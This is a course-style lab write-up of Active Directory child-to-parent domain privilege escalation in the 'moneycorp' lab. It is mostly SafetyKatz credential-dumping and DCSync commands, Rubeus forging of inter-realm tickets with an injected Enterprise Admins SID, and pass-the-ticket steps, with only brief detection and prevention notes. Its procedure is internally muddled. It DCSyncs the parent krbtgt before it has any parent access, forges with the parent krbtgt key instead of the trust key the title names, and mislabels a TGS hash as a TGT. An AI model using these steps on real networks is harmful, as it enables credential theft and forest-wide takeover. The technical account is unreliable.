#  Learning Objective 18 — Parent Domain Privilege Escalation via Domain Trust Key

**Date:** 16 August 2026

---

## Objective Overview

Using Domain Admin access in child domain (dollarcorp.moneycorp.local):
1. Extract trust key between child and parent domain
2. Extract KRBTGT from parent domain (moneycorp.local)
3. Forge inter-realm TGT for parent domain
4. Escalate to Enterprise Admin or DA in parent domain
5. Achieve forest-wide compromise

---

## Parent-Child Domain Trust Relationship

**Domain Hierarchy:**
```
moneycorp.local (Parent Forest Root)
    └── dollarcorp.moneycorp.local (Child Domain)
        └── us.dollarcorp.moneycorp.local (Grandchild)
```

**Trust Relationship:**
- Child trusts parent (automatic two-way trust)
- Trust key = Shared secret between domains
- Parent domain authentication required for cross-domain access

---

## Prerequisites

- **Domain Admin access in child domain** (dollarcorp.moneycorp.local)
- **Access to child domain DC** (dcorp-dc)
- **Rubeus.exe** for ticket manipulation
- **SafetyKatz.exe** for credential extraction
- **Parent domain DC reachable** (mcorp-dc)

---

## Step 1: Extract Trust Key (Inter-Realm Key)

**From child domain (as DA), extract trust key for parent domain:**

```powershell
SafetyKatz.exe "lsadump::lsa /patch" "exit"
```

Dumps LSA secrets including domain trust keys.

---

**Output:**
```
Domain: dollarcorp.moneycorp.local
Trust Account: $ (implicit)
Trust Key (Parent): d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2
```

---

**Alternative: Use Mimikatz directly**

```powershell
SafetyKatz.exe "lsadump::trust /patch" "exit"
```

---

**Extract specific trust key:**

```powershell
SafetyKatz.exe "lsadump::lsa /name:moneycorp" "exit"
```

Extract trust key for moneycorp.local specifically.

---

## Step 2: Extract Parent Domain KRBTGT

**With DA access, extract KRBTGT from parent domain via DCSync:**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:moneycorp\krbtgt" "exit"
```

Extract parent domain KRBTGT hash.

---

**Output:**
```
moneycorp\krbtgt:
  NTLM: 17e8f4d3f4b46e95048a66a5dd890ee3
  AES256: abc123def456789...
```

Extract either NTLM or AES256 (AES256 preferred for stealth).

---

## Step 3: Get Required Domain SIDs

**Child domain SID (dollarcorp):**

```powershell
Get-DomainSID -Domain dollarcorp.moneycorp.local
```

Output: `S-1-5-21-719815819-3726368948-3917688648`

---

**Parent domain SID (moneycorp):**

```powershell
Get-DomainSID -Domain moneycorp.local
```

Output: `S-1-5-21-335606122-960912869-3279953914`

---

**Enterprise Admins SID (parent forest root):**

Append `-519` to parent domain SID:
```
S-1-5-21-335606122-960912869-3279953914-519
```

---

## Step 4: Forge Inter-Realm TGT for Parent Domain

**Create Silver Ticket for parent domain KRBTGT:**

```powershell
Rubeus.exe silver 
  /service:krbtgt/MONEYCORP.LOCAL 
  /aes256:abc123def456789... 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /sids:S-1-5-21-335606122-960912869-3279953914-519 
  /ldap 
  /user:Administrator 
  /nowrap
```

**Parameters:**
- `/service:krbtgt/MONEYCORP.LOCAL` — Parent domain KRBTGT service
- `/aes256` — Parent domain KRBTGT AES256 hash
- `/sid` — Child domain SID (dollarcorp)
- `/sids:...519` — Enterprise Admins SID of parent (moneycorp)
- `/ldap` — Enable LDAP (for DCSync access)
- `/user:Administrator` — Impersonate Administrator in parent domain
- `/nowrap` — No line wrapping

---

**Output:**
```
[*] Action: Build TGT
[+] Ticket: $krb5tgs$23$*Administrator$MONEYCORP.LOCAL$krbtgt/MONEYCORP.LOCAL*$...
[+] Base64: oIIGK...
```

Copy entire Base64 encoded ticket.

---

## Step 5: Request Service Ticket in Parent Domain

**Use forged inter-realm TGT to request service ticket in parent:**

```powershell
Rubeus.exe asktgs 
  /service:ldap/mcorp-dc.moneycorp.local 
  /dc:mcorp-dc.moneycorp.local 
  /ptt 
  /ticket:$krb5tgs$23$*Administrator$MONEYCORP.LOCAL$krbtgt/MONEYCORP.LOCAL*$...
```

**Parameters:**
- `/service:ldap/mcorp-dc.moneycorp.local` — LDAP service in parent domain DC
- `/dc:mcorp-dc.moneycorp.local` — Parent domain DC
- `/ptt` — Pass-the-ticket (load into memory)
- `/ticket` — Forged inter-realm TGT from Step 4

---

**Output:**
```
[*] Action: Ask TGS
[*] Using inter-realm TGT for MONEYCORP.LOCAL
[+] TGS obtained: ldap/mcorp-dc.moneycorp.local
[+] Ticket loaded into memory
```

---

## Step 6: Verify Ticket Loaded

```powershell
klist
```

Should show:
```
Current LogonId is 0:0x1a4e8e
Cached Tickets: (1)

#0>     Client: Administrator @ MONEYCORP.LOCAL
        Server: ldap/mcorp-dc.moneycorp.local @ MONEYCORP.LOCAL
        ...
```

---

## Step 7: Execute DCSync in Parent Domain

**With LDAP ticket loaded, extract parent domain credentials:**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:moneycorp\Administrator" "exit"
```

Extract parent domain Administrator hash.

---

**Extract parent domain KRBTGT:**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:moneycorp\krbtgt /domain:moneycorp.local" "exit"
```

Extract all parent domain credentials.

---

## Step 8: Access Parent Domain Resources

**Remote access to parent domain DC:**

```powershell
Enter-PSSession -ComputerName mcorp-dc.moneycorp.local
```

Remote shell as Administrator in parent domain.

---

**Verify Enterprise Admin access:**

```powershell
whoami
# Output: MONEYCORP\Administrator

Get-ADGroup "Enterprise Admins" -Server mcorp-dc.moneycorp.local
# Verify Administrator is member
```

---

## Complete Parent Domain Escalation Workflow

```
1. Gain DA access in child domain (dollarcorp)
   ↓
2. Extract inter-realm trust key (krbtgt child→parent)
   (SafetyKatz lsadump::lsa /patch)
   ↓
3. Extract parent domain KRBTGT via DCSync
   (SafetyKatz lsadump::dcsync /user:moneycorp\krbtgt)
   ↓
4. Get child domain SID (dollarcorp)
   (Get-DomainSID)
   ↓
5. Get parent domain SID (moneycorp)
   (Get-DomainSID -Domain moneycorp.local)
   ↓
6. Get Enterprise Admins SID from parent
   (Parent SID + -519)
   ↓
7. Forge inter-realm TGT for parent KRBTGT
   (Rubeus silver /service:krbtgt/MONEYCORP.LOCAL)
   (/sids:Enterprise-Admins-SID-519)
   (/user:Administrator /ldap)
   ↓
8. Request LDAP TGS in parent domain
   (Rubeus asktgs /service:ldap/mcorp-dc)
   (/dc:mcorp-dc.moneycorp.local /ptt)
   ↓
9. Load ticket into memory
   ↓
10. Execute DCSync in parent domain
    (Extract parent domain Administrator/KRBTGT)
    ↓
11. Access parent domain as Enterprise Admin
    ↓
12. Forest-wide compromise
```

---

## Key Differences: Trust Key vs KRBTGT

| Component | Purpose | Source |
|---|---|---|
| Trust Key | Encrypts inter-realm tickets | Child-parent domain trust |
| KRBTGT | Encrypts intra-domain tickets | Parent domain DC |
| When Needed | To create inter-realm ticket | To request service in parent |

---

## SID Injection for Enterprise Admin Escalation

**Normal ticket contains:**
- User SID (Administrator)
- User's groups (Domain Admins, etc.)

**With /sids (Enterprise Admins):**
- User SID (Administrator)
- User's groups
- **PLUS Enterprise Admins SID**

**Result:** Administrator now has Enterprise Admin privileges in parent domain.

---

## Alternative Services in Parent Domain

| Service | Capability | Command |
|---|---|---|
| ldap/mcorp-dc | LDAP (DCSync, query) | `Rubeus.exe asktgs /service:ldap/mcorp-dc` |
| cifs/mcorp-dc | SMB (file access) | `Rubeus.exe asktgs /service:cifs/mcorp-dc` |
| host/mcorp-dc | WinRM (PSRemoting) | `Rubeus.exe asktgs /service:host/mcorp-dc` |
| http/mcorp-dc | HTTP access | `Rubeus.exe asktgs /service:http/mcorp-dc` |
| krbtgt/MONEYCORP | Golden Ticket | Extract KRBTGT, create Golden Ticket |

---

## Multi-Level Domain Escalation

**If grandchild domain exists:**
```
us.dollarcorp.moneycorp.local (Grandchild)
    └── Extract trust key to dollarcorp
    └── Request TGS in dollarcorp
    └── Follow same steps for parent escalation
    └── Eventually reach forest root (moneycorp.local)
```

---

## Detection

**What logs:**
- TGS request for krbtgt (4769)
- Cross-domain authentication (4781)
- Unusual TGT for inter-realm service
- SID injection patterns (if monitored)

**What doesn't log:**
- Rubeus silver ticket generation (local operation)
- Trust key extraction (lsadump is DA operation)
- Ticket forgery mechanics
- /sids injection (hard to detect without event forwarding)

---

## Prevention

- **Monitor inter-realm TGT requests** — Alert on krbtgt/PARENT requests
- **Audit trust relationships** — Review parent-child trusts regularly
- **Protect KRBTGT accounts** — Highest tier security
- **Monitor DCSync attempts** — Alert on DCSync from child to parent
- **Implement PAM (Privileged Access Management)** — Restrict DA access
- **Enable enhanced auditing** — Kerberos events, SID injection
- **Segment domains** — Use selective authentication
- **Implement PKINIT** — Reduce reliance on password-based auth

---

## Selective Authentication

**Defense against trust abuse:**

```powershell
# Disable two-way trust for specific domain
Set-ADTrust -Identity dollarcorp.moneycorp.local -SelectiveAuthenticationEnabled $true
```

Restricts which users can authenticate across trust (but can be bypassed).

---

## Real-World Impact

**Child domain DA → Forest-wide compromise:**
1. Extract trust key
2. Forge inter-realm ticket
3. Request LDAP access to parent
4. DCSync parent domain
5. Extract parent KRBTGT
6. Create Golden Tickets in parent domain
7. Persistent access across entire forest
8. Access all domains in forest

---

## Command Reference

| Task | Command |
|---|---|
| Extract trust key | `SafetyKatz.exe "lsadump::lsa /patch"` |
| Extract parent KRBTGT | `SafetyKatz.exe "lsadump::dcsync /user:moneycorp\\krbtgt"` |
| Get child domain SID | `Get-DomainSID -Domain dollarcorp.moneycorp.local` |
| Get parent domain SID | `Get-DomainSID -Domain moneycorp.local` |
| Forge inter-realm TGT | `Rubeus.exe silver /service:krbtgt/MONEYCORP.LOCAL /aes256:<key> /sids:<EA-SID-519>` |
| Request parent TGS | `Rubeus.exe asktgs /service:ldap/mcorp-dc /dc:mcorp-dc /ticket:<TGT>` |
| Verify ticket | `klist` |
| DCSync parent | `SafetyKatz.exe "lsadump::dcsync /user:moneycorp\\krbtgt /domain:moneycorp.local"` |

---

## Key Takeaway

```
PARENT DOMAIN PRIVILEGE ESCALATION:
1. DA in child domain = DA in entire forest (via trust key)
2. Extract inter-realm trust key (krbtgt parent→child)
3. Extract parent domain KRBTGT
4. Forge inter-realm TGT with Administrator + EA SID
5. Request LDAP TGS in parent domain
6. Execute DCSync in parent = Forest compromise
7. Trust relationships = Privilege escalation highways
```

---

## References

- [Rubeus - Silver Ticket & Inter-Realm](https://github.com/GhostPack/Rubeus)
- [Parent-Child Domain Attacks (Harmj0y)](https://blog.harmj0y.net/redteaming/the-forest-is-under-control/)
- [SafetyKatz - DCSync](https://github.com/GhostPack/SafetyKatz)
- [Trust Relationships (Microsoft)](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-design-models)

---

*Next: Forest-Wide Cleanup & Persistence*
